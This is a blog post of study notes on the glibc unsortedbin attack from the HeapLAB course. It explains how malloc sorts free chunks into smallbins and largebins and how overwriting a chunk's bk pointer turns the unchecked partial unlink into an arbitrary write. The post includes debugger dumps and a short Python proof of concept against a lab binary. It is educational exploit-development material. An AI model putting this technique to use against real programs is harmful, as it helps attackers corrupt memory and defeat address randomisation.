---
layout: post
title:  "HeapLAB 1 - Unsortedbin Attack"
date:   2022-12-07 20:02:00 +0300
categories: jekyll update
---

**Contents**
* TOC
{:toc}
## Unsortedbin Attack

This attack gives a leak primitive - allows to write the `arena` address to an arbitrary address. 

In case of the `main_arena`, this allows leaking libc. 

Moreover, many techniques uses the `unsortedbin attack` primitive. \
For example, `House of Orange`- which targets `_IO_list_all`, creating a fake file stream on the arena addresses, as well as the `House of Prime`, which uses the primitive to corrupt `global_max_fast`. 

### Chunk Fates

The `free` function may directly populate the `fastbins` (if the chunk size is below `0x80`), the `top_chunk` (if it is adjacent / consolidates with an adjacent chunk), the `unsortedbin` (if its not within the first two options) or the `tcachebin`. 

However, there are two more bins (`smallbins, largebins`) that *arent populated directly by the free() function*.

In fact, chunks may move from the `unsortedbin` to these two bins through a process known as *sorting*. \
This procedure may trigger during calls to `malloc()`!

### Smallbins

Doubly-linked, circular freelists. \
There are 62 smallbins - from size `0x20 to 0x3f0` (overlapping `fastbins` sizes). 

Their methodology is FIFO (like the `unsortedbin`, new chunk registered to the head, allocations are made from tail).

Like the `fastbins`, each bin contains chunks of the same size. 

### Largebins

Doubly-linked, circular freelists. \
However, each bin contains *range of sizes*, instead of a specific size. 

They operate differently, using a `skiplist`. 

### Unsortedbin Scanning

Sorting moves free chunks from the `unsortedbin` into the `small/largebins`. 

Issued once malloc searches an `unsortedbin` while trying to serve a request. 

Note: allocations from the `unsortedbin` are *exact fit*, meaning that by requesting `0x90` size chunk, it will only return `0x90` size chunk - even if larger ones are available. 

During the search for a matching chunk, Malloc sorts the not-adquate chunks from the `unsortedbin` to their respective `smallbin / largebin`. 

For example, requesting chunk `0x90` from the following `unsortedbin` (when the `0x90` bins are empty): `[0x100, 0x90, 0x400, 0x230]`, malloc will start searching the `unsortedbin` from back to front (as allocations are being started from the tail).

It will sort `0x230` to its smallbin, `0x400` to its largebin, and allocate the `0x90` chunk, as it is an exact fit. The chunk `0x100` remaines at the unsortedbin. 

There is exception to the exact-fit - called `last remainder`. 

### Partial Unlink

Note that upon unlinking a chunk from the `unsortedbin` this way, it can actually perform an optimization, called *partial unlink*. \
Because the victim chunk is always the tail of the bin, partially unlinking can be done as follow:

```c
(victim->bk)->fd = unsortedbin_head  // victim removed from the forward list
unsortedbin_head->bk = victim->bk  // victim removed from the backward list
```

Note that the `unsortedbin_head` is an arena address. 

Unlike the unlink macro / partial unlinks from the smallbins, unsortedbin partial unlinks are not subject to any integrity check. 

The idea is to overwrite `victim->bk`, then trigger partial unlink, writing the address of the unsortedbin to any arbitrary address we choose (see the first line of the C code above). 

Recall the `victim->fd` is completely ignored within this partial unlinking, hence it may contain any arbitrary value we wish. 

It is important to concern that that after unlinking the victim chunk, `unsorted_head->bk`, aka the tail of the unsortedbin, is the attacker data. \
It means that after sorting the victim chunk (in case it wasnt an exact fit - hence was moved to a `smallbin` or `largebin`), it will *continue* to search for chunks from this address. \
Therefore, usually it is easier to just perform an exact allocation from the unsortedbin to trigger the unlink. 

### Exploitation

Example of overwriting arbitrary address (the heap first quadword) to the unsortedbin arena address.

Initially, the following arena layout is made:

```bash
pwndbg> dq &main_arena 40
00007fb871b10b20     0000000100000000 0000000000000000
00007fb871b10b30     0000000000000000 0000000000000000
00007fb871b10b40     0000000000000000 0000000000000000
00007fb871b10b50     0000000000000000 0000000000000000
00007fb871b10b60     0000000000000000 0000000000000000
00007fb871b10b70     0000000000000000 0000000000758000
00007fb871b10b80     0000000000000000 00007fb871b10b78
00007fb871b10b90     00007fb871b10b78 00007fb871b10b88
00007fb871b10ba0     00007fb871b10b88 00007fb871b10b98
```

The top chunk ptr is stored at `0x00007fb871b10b78`. \ 
Moreover, the fake unsortedbin head chunk starts at `00007fb871b10b78`. \
Its `PREV_SIZE` field isused as the top chunk ptr, while its `fd` and `bk` ptrs both initially points toward `0x00007fb871b10b78` - the fake chunk itself.  

After executing the unlink:

```bash
pwndbg> vis

0x2205000       0x00007f8abe9b1b78      0x0000000000000091      x...............  <-- unsortedbin[all][0]
0x2205010       0x0000000000000000      0x0000000002204ff0      .........O .....
0x2205020       0x0000000000000000      0x0000000000000000      ................
0x2205030       0x0000000000000000      0x0000000000000000      ................

pwndbg> dq &main_arena 20
00007f8abe9b1b20     0000000100000000 0000000000000000
00007f8abe9b1b30     0000000000000000 0000000000000000
00007f8abe9b1b40     0000000000000000 0000000000000000
00007f8abe9b1b50     0000000000000000 0000000000000000
00007f8abe9b1b60     0000000000000000 0000000000000000
00007f8abe9b1b70     0000000000000000 00000000022050b0
00007f8abe9b1b80     0000000000000000 0000000002205000
00007f8abe9b1b90     0000000002204ff0 00007f8abe9b1b88
00007f8abe9b1ba0     00007f8abe9b1b88 00007f8abe9b1b98
00007f8abe9b1bb0     00007f8abe9b1b98 00007f8abe9b1ba8
```

It means that the first heap quadword was overwritten with the value of the unsortedbin fake chunk, that starts at `0x00007f8abe9b1b78`. 

The fake unsortedbin head chunk's `fd` has changed to `0x2205000`, and its `bk` has changed to `0x2204ff0`. \
This is due to the partial unlink, as I chose `victim->bk = heap - 16`). \
Note that the fake chunk `fd` was changed only because the length of the linked list was 1. \
In case there were more elements within the unsortedbin, its `fd` would remain being pointed to them. 

POC:

```python
# Request 2 chunks.
chunk_A = malloc(0x88)
# Guards against consolidation with the top chunk
chunk_B = malloc(0x18)

# Free "chunk_A".
free(chunk_A)

# Overwrite the bk of the unsorted victim chunk
new_bk = heap - 0x10
edit(chunk_A, p64(0) + p64(new_bk))

# Trigger the unsorted chunk unlink by allocating it
malloc(0x88)
```

